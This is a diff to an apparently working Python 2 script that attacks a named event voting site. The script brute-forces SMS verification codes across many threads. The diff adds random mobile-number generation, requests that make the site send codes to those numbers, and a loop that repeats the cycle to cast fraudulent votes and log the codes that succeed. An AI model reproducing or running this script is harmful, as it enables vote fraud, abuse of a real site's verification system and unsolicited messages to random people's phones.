@@ -6,6 +6,7 @@ import datetime
 import itertools
 from functools import wraps
 import threading
+from random import randint
 
 def ex(default=0):
     def wrapper(fn):
@@ -49,7 +50,7 @@ def sc(mob, id=5, start='000000', timeout=2):
                 'yzm': yzm,
                }
         c = 0
-        while c < 5:
+        while c < 10:
             try:
                 r = requests.post(url, data=data, headers=headers, timeout=timeout)
                 break
@@ -66,7 +67,7 @@ def sc(mob, id=5, start='000000', timeout=2):
 
 @pace
 def msc(mob, id=5, group='0', timeout=2):
-    global END_FLAG
+    global END_FLAG, HIT_RESULT
     #time.sleep(0.001)
     url = 'http://events.chncpa.org/wmx2016/action/toupiao.php'
     headers = {'X-Requested-With': 'XMLHttpRequest'}
@@ -82,7 +83,7 @@ def msc(mob, id=5, group='0', timeout=2):
                 'yzm': yzm,
                }   
         c = 0 
-        while c < 5:
+        while c < 10:
             try:
                 r = requests.post(url, data=data, headers=headers, timeout=timeout)
                 break
@@ -90,16 +91,23 @@ def msc(mob, id=5, group='0', timeout=2):
                 print str(e), c, group
                 c += 1
                 time.sleep(0.5)
-                 
-        if r.json()['status']!=0:
-            print '----Got it!-----'
-            print r.text, yzm, mob, id
+        status = r.json()['status']         
+        if status != 0:
+            if status == 5:
+                print '----Done----'
+            elif status == 1:
+                print '----Goti----'
+                HIT_RESULT.append((mob, yzm, id, r.text))
+                print r.text, yzm, mob, id
+            else:
+                print '============', status
             END_FLAG = True
             break
 
 THREADS = []
 END_FLAG = False
-def mtask(mob, id=5, timeout=1, gd=2):
+HIT_RESULT = []
+def mtask(mob, id=5, timeout=3, gd=2):
     global THREADS
     p = itertools.product(range(10), repeat=gd)
     for i in p:
@@ -107,3 +115,34 @@ def mtask(mob, id=5, timeout=1, gd=2):
         t = threading.Thread(target=msc, args=(mob, id, g, timeout))
         THREADS.append(t)
         t.start()
+
+
+def gen_mob():
+    return str(randint(13000000000, 13999999999))
+
+
+def post_mob(mob, id=5):
+    url = 'http://events.chncpa.org/wmx2016/action/yzmob.php'
+    headers = {'X-Requested-With': 'XMLHttpRequest'}
+    data = {'id': id, 'mob': mob, 'yzm': ''}
+    c = 0
+    while c < 100:
+        try:
+            r = requests.post(url, headers=headers, data=data)
+            break
+        except:
+            c += 1
+            time.sleep(1)
+    return r
+
+
+def loop(n=100):
+    global THREADS, END_FLAG
+    for i in xrange(n):
+        mob = gen_mob()
+        post_mob(mob)
+        mtask(mob=mob)
+        END_FLAG = False
+        THREADS = []
+
+
